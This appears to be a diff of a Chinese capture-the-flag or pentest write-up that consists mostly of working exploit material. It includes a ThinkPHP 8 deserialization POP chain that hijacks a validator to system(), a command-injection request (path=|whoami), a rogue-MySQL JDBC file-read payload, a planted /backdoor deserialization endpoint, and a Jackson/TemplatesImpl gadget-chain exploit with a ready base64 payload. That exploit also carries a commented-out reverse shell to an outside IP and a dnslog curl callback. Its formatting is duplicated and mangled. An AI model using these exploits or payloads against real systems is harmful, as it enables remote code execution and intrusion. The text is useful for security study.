+rule', 'allowIp' =>'access IP is not allowed', 'denyIp' =>'access IP denied', 'confirm' =>':
+attribute out of accord with :2', 'different' =>':
+attribute cannot be same with :2', 'egt' =>':
+attribute must greater than or equal :
+rule', 'gt' =>':
+attribute must greater than :
+rule', 'elt' =>':
+attribute must less than or equal :
+rule', 'lt' =>':
+attribute must less than :
+rule', 'eq' =>':
+attribute must equal :
+rule', 'unique' =>':
+attribute has exists', 'regex' =>':
+attribute not conform to the rules', 'method' =>'invalid Request method', 'token' =>'invalid token', 'fileSize' =>'filesize not match', 'fileExt' =>'extensions to upload is not allowed', 'fileMime' =>'mimetype to upload is not allowed', 'startWith' =>':
+attribute must start with :
+rule', 'endWith' =>':
+attribute must end with :
+rule', 'contain' =>':
+attribute must contain :
+rule', ]; /** * 当前验证场景 * @var string */ protected$currentScene; /** * 内置正则验证规则 * @var array */ protected$defaultRegex= [ 'alpha' =>'/^[A-Za-z]+$/', 'alphaNum' =>'/^[A-Za-z0-9]+$/', 'alphaDash' =>'/^[A-Za-z0-9-_]+$/', 'chs' =>'/^[p{Han}]+$/u', 'chsAlpha' =>'/^[p{Han}a-zA-Z]+$/u', 'chsAlphaNum'=>'/^[p{Han}a-zA-Z0-9]+$/u', 'chsDash' =>'/^[p{Han}a-zA-Z0-9_-]+$/u', 'mobile' =>'/^1[3-9]d{9}$/', 'idCard' =>'/(^[1-9]d{5}(18|19|([23]d))d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}[0-9Xx]$)|(^[1-9]d{5}d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}$)/', 'zip' =>'/d{6}/', ]; /** * Filter_var 规则 * @var array */ protected$filter= [ 'email' => FILTER_VALIDATE_EMAIL, 'ip' => [FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6], 'integer'=> FILTER_VALIDATE_INT, 'url' => FILTER_VALIDATE_URL, 'macAddr'=> FILTER_VALIDATE_MAC, 'float' => FILTER_VALIDATE_FLOAT, ]; /** * 验证场景定义 * @var array */ protected$scene= [];因此可以劫持hidden映射给system
+class Validate { protected$type= ["hidden"=>"system"];}
 namespace SymfonyComponentVarDumperCaster;class ConstStub extends Stub { public$value="cat /flag";}
-```
-
-
-
-```
-<?php// +----------------------------------------------------------------------+// | ThinkPHP 8 反序列化POP链利用代码// | 利用入口: /api/login/get_account (Cookie: account=...)// +----------------------------------------------------------------------+// ===== 第一阶段：Symfony VarDumper组件（命令存储） =====namespace SymfonyComponentVarDumperCloner { class Stub { public$value='curl kd35jg.dnslog.cn'; public$type= 5; }}namespace SymfonyComponentVarDumperCaster { use SymfonyComponentVarDumperClonerStub; class ConstStub extends Stub {} // 继承Stub以传递命令}// ===== 第二阶段：ThinkPHP验证器（函数劫持） =====namespace think { use SymfonyComponentVarDumperCasterConstStub; class Validate { protected$type= []; // 关键：验证类型映射表 publicfunction__construct() { // 将"hidden"验证类型劫持到system函数 $this->type= ["hidden"=>"system"]; } } abstract class Model { protected$append= []; // 触发属性追加 protected$relation= []; // 绑定验证器 protected$hidden= []; // 存储命令对象 publicfunction__construct() { // 构造三角关系：append -> hidden -> relation $this->hidden = ["pwn"=> new ConstStub()]; //"pwn"是触发属性名 $this->append = ["pwn"=> []]; // 触发对"pwn"属性的访问 $this->relation = ["pwn"=> new Validate()]; // 访问时调用Validate验证器 } }}// ===== 第三阶段：ThinkPHP模型（触发载体） =====namespace thinkmodel { use thinkModel; class Pivot extends Model {} // 具体模型类，继承Model的触发逻辑}// ===== 第四阶段：ThinkPHP路由（入口包装） =====namespace thinkroute { use thinkmodelPivot; abstract class Rule { protected$rule="1.2"; protected$option= []; // 路由参数，存放Pivot对象 publicfunction__construct() { // 将Pivot对象埋入路由参数中 $this->option = ["var"=> ["1"=> new Pivot()]]; } } class RuleGroup extends Rule { publicfunction__construct() { parent::__construct(); } } class Resource extends RuleGroup {} // 具体路由规则类 class ResourceRegister { protected$resource; // 启动链的入口属性 publicfunction__construct() { $this->resource = new Resource(); // 包装Resource对象 } }}namespace { $entry= new thinkrouteResourceRegister(); $payload= base64_encode(serialize($entry)); echo"生成的Payload:n"; echo$payload."nn"; echo"利用方式:n"; echo"GET /api/login/get_account HTTP/1.1n"; echo"Host: target.comn"; echo"Cookie: account=".$payload."n";}
-```
-
-
-
-```
-GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.txt&target=C:/Users/attac/Downloads/192.168.20.128/202511190920/static/ HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
-```
-
-
-
-```
-POST /blog/api/filelist HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12path=|whoami
-```
-
-
-
-```
+<?php// +----------------------------------------------------------------------+// | ThinkPHP 8 反序列化POP链利用代码// | 利用入口: /api/login/get_account (Cookie: account=...)// +----------------------------------------------------------------------+// ===== 第一阶段：Symfony VarDumper组件（命令存储） =====namespace SymfonyComponentVarDumperCloner { class Stub { public$value='curl kd35jg.dnslog.cn'; public$type= 5; }}namespace SymfonyComponentVarDumperCaster { use SymfonyComponentVarDumperClonerStub; class ConstStub extends Stub {} // 继承Stub以传递命令}// ===== 第二阶段：ThinkPHP验证器（函数劫持） =====namespace think { use SymfonyComponentVarDumperCasterConstStub; class Validate { protected$type= []; // 关键：验证类型映射表 publicfunction__construct() { // 将"hidden"验证类型劫持到system函数 $this->type= ["hidden"=>"system"]; } } abstract class Model { protected$append= []; // 触发属性追加 protected$relation= []; // 绑定验证器 protected$hidden= []; // 存储命令对象 publicfunction__construct() { // 构造三角关系：append -> hidden -> relation $this->hidden = ["pwn"=> new ConstStub()]; //"pwn"是触发属性名 $this->append = ["pwn"=> []]; // 触发对"pwn"属性的访问 $this->relation = ["pwn"=> new Validate()]; // 访问时调用Validate验证器 } }}// ===== 第三阶段：ThinkPHP模型（触发载体） =====namespace thinkmodel { use thinkModel; class Pivot extends Model {} // 具体模型类，继承Model的触发逻辑}// ===== 第四阶段：ThinkPHP路由（入口包装） =====namespace thinkroute { use thinkmodelPivot; abstract class Rule { protected$rule="1.2"; protected$option= []; // 路由参数，存放Pivot对象 publicfunction__construct() { // 将Pivot对象埋入路由参数中 $this->option = ["var"=> ["1"=> new Pivot()]]; } } class RuleGroup extends Rule { publicfunction__construct() { parent::
+__construct(); } } class Resource extends RuleGroup {} // 具体路由规则类 class ResourceRegister { protected$resource; // 启动链的入口属性 publicfunction__construct() { $this->resource = new Resource(); // 包装Resource对象 } }}namespace { $entry= new thinkrouteResourceRegister(); $payload= base64_encode(serialize($entry)); echo"生成的Payload:n"; echo$payload."nn"; echo"利用方式:n"; echo"GET /api/login/get_account HTTP/1.1n"; echo"Host: target.comn"; echo"Cookie: account=".$payload."n";}
+GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.txt&target=C:/Users/attac/Downloads/192.168.20.128/202511190920/static/ HTTP/1.1Host: localhost:
+8080sec-ch-ua:
+sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
+POST /blog/api/filelist HTTP/1.1Host: localhost:
+8080sec-ch-ua:
+sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12path=|whoami
 http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/https://www.vesiluoma.com/abusing-mysql-clients/
-```
-
-
-
-```
-POST /database/testConnection HTTP/1.1Host: localhost:8080Content-Type: application/jsonContent-Length: 235{"dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://{服务器ip}:3306/fake_db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/","dbUsername":"caonima","dbPassword":"hack"}
-```
-
-
-
-```
+POST /database/testConnection HTTP/1.1Host: localhost:
+8080Content-Type: application/jsonContent-Length: 235{"dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:
+mysql://{服务器ip}:
+3306/fake_db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/","dbUsername":"caonima","dbPassword":"hack"}
 @PostMapping({"/backdoor"})public void backdoor(String data) throws Exception { this.commentService.deserialize(data);}private void completeComment(BizComment comment) {HttpServletRequest request = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();User user = (User)SecurityUtils.getSubject().getPrincipal();comment.setUserId(user.getUserId());comment.setNickname(user.getNickname());comment.setEmail(user.getEmail());comment.setAvatar(user.getImg());comment.setIp(IpUtil.getIpAddr(request));comment.setStatus(CoreConst.STATUS_VALID);}public CommentController(final BizCommentService commentService) { this.commentService = commentService;}}
-```
-
-
-
-```
-//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.puboot.module.admin.service.impl;import com.baomidou.mybatisplus.core.metadata.IPage;import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;import com.puboot.common.util.Pagination;import com.puboot.module.admin.mapper.BizCommentMapper;import com.puboot.module.admin.model.BizComment;import com.puboot.module.admin.service.BizCommentService;import com.puboot.module.admin.vo.CommentConditionVo;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import java.util.Base64;import java.util.HashMap;import org.springframework.stereotype.Service;@Servicepublic class BizCommentServiceImpl extends ServiceImpl<BizCommentMapper, BizComment> implements BizCommentService { private final BizCommentMapper commentMapper; public IPage<BizComment> selectComments(CommentConditionVo vo, Integer pageNumber, Integer pageSize) { IPage<BizComment> page = new Pagination((long)pageNumber, (long)pageSize); page.setRecords(this.commentMapper.selectComments(page, vo)); returnpage; } public int deleteBatch(Integer[] ids) { returnthis.commentMapper.deleteBatch(ids); } public Object deserialize(String data) throws IOException { if(data == null) { throw new IOException("data is null"); }else{ byte[] decode; try { decode = Base64.getDecoder().decode(data); } catch (IllegalArgumentException var36) { IllegalArgumentException e = var36; throw new IOException("Base64 decode failed", e); } ByteArrayInputStream bais = new ByteArrayInputStream(decode); Throwable var4 = null; Object e; try { ObjectInputStream ois = new ObjectInputStream(bais) { boolean check =false; protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { Class<?> targetc = super.resolveClass(desc); if(!this.check && !HashMap.class.isAssignableFrom(targetc)) { throw new IllegalArgumentException("HackerClass:"+ targetc); }else{ this.check =true; returntargetc; } } }; Throwable var6 = null; try { try { e = ois.readObject(); } catch (ClassNotFoundException var34) { e = var34; throw new RuntimeException((Throwable)e); } } catch (Throwable var35) { e = var35; var6 = var35; throw var35; } finally { if(ois != null) { if(var6 != null) { try { ois.close(); } catch (Throwable var33) { var6.addSuppressed(var33); } }else{ ois.close(); } } } } catch (Throwable var38) { var4 = var38; throw var38; } finally { if(bais != null) { if(var4 != null) { try { bais.close(); } catch (Throwable var32) { var4.addSuppressed(var32); } }else{ bais.close(); } } } returne; } } public BizCommentServiceImpl(final BizCommentMapper commentMapper) { this.commentMapper = commentMapper; }}
-```
-
-
-
-```
+//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.puboot.module.admin.service.impl;
+import com.baomidou.mybatisplus.core.metadata.IPage;
+import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
+import com.puboot.common.util.Pagination;
+import com.puboot.module.admin.mapper.BizCommentMapper;
+import com.puboot.module.admin.model.BizComment;
+import com.puboot.module.admin.service.BizCommentService;
+import com.puboot.module.admin.vo.CommentConditionVo;
+import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectStreamClass;
+import java.util.Base64;
+import java.util.HashMap;
+import org.springframework.stereotype.Service;@Servicepublic class BizCommentServiceImpl extends ServiceImpl implements BizCommentService { private final BizCommentMapper commentMapper; public IPage selectComments(CommentConditionVo vo, Integer pageNumber, Integer pageSize) { IPage page = new Pagination((long)pageNumber, (long)pageSize); page.setRecords(this.commentMapper.selectComments(page, vo)); returnpage; } public int deleteBatch(Integer[] ids) { returnthis.commentMapper.deleteBatch(ids); } public Object deserialize(String data) throws IOException { if(data == null) { throw new IOException("data is null"); }else{ byte[] decode; try { decode = Base64.getDecoder().decode(data); } catch (IllegalArgumentException var36) { IllegalArgumentException e = var36; throw new IOException("Base64 decode failed", e); } ByteArrayInputStream bais = new ByteArrayInputStream(decode); Throwable var4 = null; Object e; try { ObjectInputStream ois = new ObjectInputStream(bais) { boolean check =false; protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { Class<?> targetc = super.resolveClass(desc); if(!this.check && !HashMap.class.isAssignableFrom(targetc)) { throw new IllegalArgumentException("HackerClass:"+ targetc); }else{ this.check =true; returntargetc; } } }; Throwable var6 = null; try { try { e = ois.readObject(); } catch (ClassNotFoundException var34) { e = var34; throw new RuntimeException((Throwable)e); } } catch (Throwable var35) { e = var35; var6 = var35; throw var35; } finally { if(ois != null) { if(var6 != null) { try { ois.close(); } catch (Throwable var33) { var6.addSuppressed(var33); } }else{ ois.close(); } } } } catch (Throwable var38) { var4 = var38; throw var38; } finally { if(bais != null) { if(var4 != null) { try { bais.close(); } catch (Throwable var32) { var4.addSuppressed(var32); } }else{ bais.close(); } } } returne; } } public BizCommentServiceImpl(final BizCommentMapper commentMapper) { this.commentMapper = commentMapper; }}
 https://github.com/FasterXML/jackson-databind/issues/2986https://zhuanlan.zhihu.com/p/1923706452289225199
-```
-
-
-
-```
 /*HashMap.readObejct() HashMap.hashcode() ObjectIdGenerator.IdKey.equals() XString.equals() POJONode.toString()*/
-```
-
-
-
-```
-HashMap::readObject() ↓HashMap::putVal() ↓ HashMap::hash() ↓ObjectIdGenerator$IdKey::hashCode() ↓POJONode::hashCode() ↓ POJONode::toString() ↓POJONode::serialize() ↓BeanSerializer::serialize() ↓BeanSerializer::serializeFields() ↓BeanPropertyWriter::serializeAsField() ↓MethodProperty::get() ↓TemplatesImpl::getOutputProperties() ↓TemplatesImpl::newTransformer() ↓TemplatesImpl::getTransletInstance() ↓TransletClassLoader::defineClass() ↓恶意类::<clinit>() ↓Runtime::exec()
-```
-
-
-
-```
-import com.fasterxml.jackson.annotation.ObjectIdGenerator;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URLEncoder;import java.util.Base64;import java.util.HashMap;public class exp { public static void main(String[] args) throws Exception { CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace"); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl tmp = new TemplatesImpl(); setValue(tmp,"_tfactory", new TransformerFactoryImpl()); setValue(tmp,"_name","Phantom"); setValue(tmp,"_bytecodes", generateEvilBytes()); POJONode pojoNode = new POJONode(tmp); ObjectIdGenerator.IdKey idkey1 = new ObjectIdGenerator.IdKey(Object.class, Object.class, new XString("")); ObjectIdGenerator.IdKey idkey2 = new ObjectIdGenerator.IdKey(Object.class, Object.class, pojoNode); setFieldValue(idkey1,"hashCode", 0); setFieldValue(idkey2,"hashCode", 2); HashMap<Object, Object> hashMap = new HashMap<Object, Object>(); hashMap.put(idkey1,"x"); hashMap.put(idkey2,"a"); setFieldValue(idkey2,"hashCode", 0); byte[] serializedData = serialize(hashMap); String base64Payload = Base64.getEncoder().encodeToString(serializedData); String urlEncodedPayload = URLEncoder.encode(base64Payload,"UTF-8"); System.out.println("Base64 Payload:"); System.out.println(base64Payload); System.out.println("nURL Encoded Payload:"); System.out.println(urlEncodedPayload); // unserialize(serializedData); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objo = new ObjectOutputStream(baos); objo.writeObject(obj); objo.close(); returnbaos.toByteArray(); } public static void unserialize(byte[] string) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(string); ObjectInputStream obji = new ObjectInputStream(bais); obji.readObject(); obji.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[][] generateEvilBytes() throws Exception { ClassPool cp = ClassPool.getDefault(); cp.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = cp.makeClass("evil"); String cmd ="java.lang.Runtime.getRuntime().exec("calc");"; // String cmd ="java.lang.Runtime.getRuntime().exec("sh -i >& /dev/tcp/154.201.70.35/8080 0>&1");"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(cp.get(AbstractTranslet.class.getName())); returnnew byte[][]{cc.toBytecode()}; } public static <T> void setValue(Object obj, String fname, T f) throws Exception { Field filed = TemplatesImpl.class.getDeclaredField(fname); filed.setAccessible(true); filed.set(obj, f); }}// Base64 Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB+AAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB+AAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr+ur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg=// URL Encoded Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB%2BAAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB%2BAAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB%2BAAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr%2Bur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg%3D
+HashMap::
+readObject() ↓HashMap::
+putVal() ↓ HashMap::
+hash() ↓ObjectIdGenerator$IdKey::
+hashCode() ↓POJONode::
+hashCode() ↓ POJONode::
+toString() ↓POJONode::
+serialize() ↓BeanSerializer::
+serialize() ↓BeanSerializer::
+serializeFields() ↓BeanPropertyWriter::
+serializeAsField() ↓MethodProperty::
+get() ↓TemplatesImpl::
+getOutputProperties() ↓TemplatesImpl::
+newTransformer() ↓TemplatesImpl::
+getTransletInstance() ↓TransletClassLoader::
+defineClass() ↓恶意类::<clinit>() ↓Runtime::
+exec()
+import com.fasterxml.jackson.annotation.ObjectIdGenerator;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URLEncoder;
+import java.util.Base64;
+import java.util.HashMap;public class exp { public static void main(String[] args) throws Exception { CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace"); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl tmp = new TemplatesImpl(); setValue(tmp,"_tfactory", new TransformerFactoryImpl()); setValue(tmp,"_name","Phantom"); setValue(tmp,"_bytecodes", generateEvilBytes()); POJONode pojoNode = new POJONode(tmp); ObjectIdGenerator.IdKey idkey1 = new ObjectIdGenerator.IdKey(Object.class, Object.class, new XString("")); ObjectIdGenerator.IdKey idkey2 = new ObjectIdGenerator.IdKey(Object.class, Object.class, pojoNode); setFieldValue(idkey1,"hashCode", 0); setFieldValue(idkey2,"hashCode", 2); HashMap<Object, Object> hashMap = new HashMap<Object, Object>(); hashMap.put(idkey1,"x"); hashMap.put(idkey2,"a"); setFieldValue(idkey2,"hashCode", 0); byte[] serializedData = serialize(hashMap); String base64Payload = Base64.getEncoder().encodeToString(serializedData); String urlEncodedPayload = URLEncoder.encode(base64Payload,"UTF-8"); System.out.println("Base64 Payload:"); System.out.println(base64Payload); System.out.println("nURL Encoded Payload:"); System.out.println(urlEncodedPayload); // unserialize(serializedData); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objo = new ObjectOutputStream(baos); objo.writeObject(obj); objo.close(); 